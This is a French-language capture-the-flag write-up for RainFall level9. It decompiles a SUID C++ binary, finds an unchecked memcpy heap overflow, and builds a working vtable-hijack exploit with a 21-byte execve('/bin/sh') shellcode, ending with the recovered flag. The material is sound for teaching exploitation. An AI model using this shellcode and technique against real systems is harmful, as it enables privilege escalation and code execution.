# RainFall CTF - Level9

## Reconnaissance

### Fichier trouvé
```bash
level9@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `bonus0` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `bonus0`

## Analyse statique avec Ghidra

### Code décompilé brut

```c
void main(int param_1,int param_2)
{
  N *this;
  N *this_00;
  
  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N::N(this,5);
  this_00 = (N *)operator.new(0x6c);
  N::N(this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (*(code *)**(undefined4 **)this_00)(this_00,this);
  return;
}

/* N::N(int) */
void __thiscall N::N(N *this,int param_1)
{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}

/* N::setAnnotation(char*) */
void __thiscall N::setAnnotation(N *this,char *param_1)
{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}

/* N::TEMPNAMEPLACEHOLDERVALUE(N&) */
int __thiscall N::operator+(N *this,N *param_1)
{
  return *(int *)(param_1 + 0x68) + *(int *)(this + 0x68);
}

/* N::TEMPNAMEPLACEHOLDERVALUE(N&) */
int __thiscall N::operator-(N *this,N *param_1)
{
  return *(int *)(this + 0x68) - *(int *)(param_1 + 0x68);
}
```

### Code traduit en langage compréhensible

```cpp
class N {
private:
    void **vtable;        // À l'adresse +0x0 
    char annotation[100]; // À l'adresse +0x4 (buffer de données)
    int value;           // À l'adresse +0x68 (104 en décimal)
    
public:
    N(int val);
    void setAnnotation(char *str);
    int operator+(N &other);
    int operator-(N &other);
};

void main(int argc, char **argv) {
    if (argc < 2) {
        exit(1);
    }
    
    N *obj1 = new N(5);
    N *obj2 = new N(6);
    
    obj1->setAnnotation(argv[1]); // Copie argv[1] dans obj1
    
    // Appel d'une fonction virtuelle via obj2 avec obj1 en paramètre
    (*(obj2->vtable[0]))(obj2, obj1);
}

void N::setAnnotation(char *param_1) {
    size_t len = strlen(param_1);
    memcpy(this + 4, param_1, len);  // ← DANGER ! Pas de vérification de taille
}
```

## Analyse des vulnérabilités

### Buffer Overflow dans setAnnotation
- **Fonction dangereuse** : `memcpy(this + 4, param_1, len)`
- **Problème** : Aucune vérification de la taille de `param_1`
- **Impact** : Débordement possible sur la heap

### Stratégie d'exploitation
On a dans la méthode `setAnnotation` un `memcpy` sans vérification de taille, ce qui nous permet de déborder et d'écrire dans la mémoire. Et juste après on a un appel à une fonction virtuelle. On peut corrompre l'adresse de la fonction virtuelle dans la vtable pour exécuter du shell code à la place d'exécuter la fonction définie dans la classe mère.

## Découverte des adresses

### Trouver l'adresse de l'objet N
On va commencer par chercher l'adresse `this` (la classe N) juste après le malloc (l'appel à `new`) pour avoir son adresse dans la mémoire.

```bash
gdb ./level9
(gdb) b *0x0804861c
(gdb) run AAAA
(gdb) i registers
eax            0x804a008    134520840
```

Donc on sait maintenant que la classe N a été enregistrée à l'adresse `0x804a008`.

### Localiser les données passées en paramètre
On va donc voir à partir d'où sont stockées les données passées en param :

```bash
gdb ./level9
(gdb) run AAAA  # (A = 0x41 en hexa donc on cherche les 41)
(gdb) x/10x 0x804a008
0x804a008:    0x08048848    0x41414141    0x00000000    0x00000000
0x804a018:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a028:    0x00000000    0x00000000
```

Donc on commence à écrire 4 bits après `0x804a008` :
**`0x804a008 + 4 = 0x804a00c`**

## Structure mémoire

### Rappel de la structure de l'objet N
```cpp
class N {
private:
    void **vtable;        // 4 bytes
    char annotation[100]; // 100 bytes  
    int value;           // 4 bytes
    ...
}
```

### Layout mémoire des objets
Dans le main on avait :
```cpp
N *obj1 = new N(5);
N *obj2 = new N(6);
```

Donc obj2 se trouve en mémoire juste après obj1.

## Construction de l'exploit

### Stratégie
Ce qu'on va faire c'est écraser l'adresse de la vtable de obj2 par du shell code que l'on place dans la variable annotation de obj1.

Pour ça on donne à `0x804a00c` l'adresse de l'octet d'après qui est : `0x804a00c + 4 = 0x804a010` et on donnera comme pointeur à vtable de obj2 `0x804a00c` pour qu'il exécute le code contenu dans la string annotation.

### Structure du payload
Donc on se retrouve avec ce payload :

```
0x804a010 + shellcode + padding + 0x804a00c
```

### Calcul du padding
La taille de `0x804a010 + shellcode + padding` doit faire 108 de long pour que `0x804a00c` écrase l'adresse de vtable de obj2.

Donc on fait : `108 - 4 (0x804a010) - 21 (taille du shell code) = 83`

## Exploitation finale

### Payload complet
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"')
```

### Résultat
```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Résultats

### Flag obtenu
```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

### Accès niveau suivant
- **Utilisateur** : `bonus0`
- **Prochain challenge** : `/home/user/bonus0/`

## Notes techniques

- **Type de vulnérabilité** : Heap Buffer Overflow + C++ vtable hijacking
- **Technique d'exploitation** : Virtual Table Overwrite
- **Architecture** : x86 (32-bit)
- **Concepts utilisés** :
  - **C++ vtables** : Redirection d'appels de fonctions virtuelles
  - **Heap exploitation** : Corruption de structures allouées dynamiquement
  - **Shellcode injection** : Injection et exécution de code malveillant
  - **Little-endian** : Format de stockage des adresses x86
- **Méthode de découverte** : Analyse statique avec Ghidra + debug dynamique avec GDB
- **Shellcode utilisé** : 21 bytes pour `execve("/bin/sh")`
- **Difficulté** : Avancée - Première exploitation C++ avec vtables du CTF

## Évolution par rapport aux niveaux précédents

Ce niveau introduit des concepts d'exploitation très avancés :
- **Exploitation C++** : Première utilisation de vulnérabilités spécifiques au C++
- **vtable hijacking** : Technique sophistiquée de redirection d'appels
- **Heap corruption** : Exploitation de structures complexes sur la heap
- **Shellcode direct** : Injection et exécution de code machine personnalisé

Cette progression marque le passage vers les techniques d'exploitation les plus sophistiquées du CTF.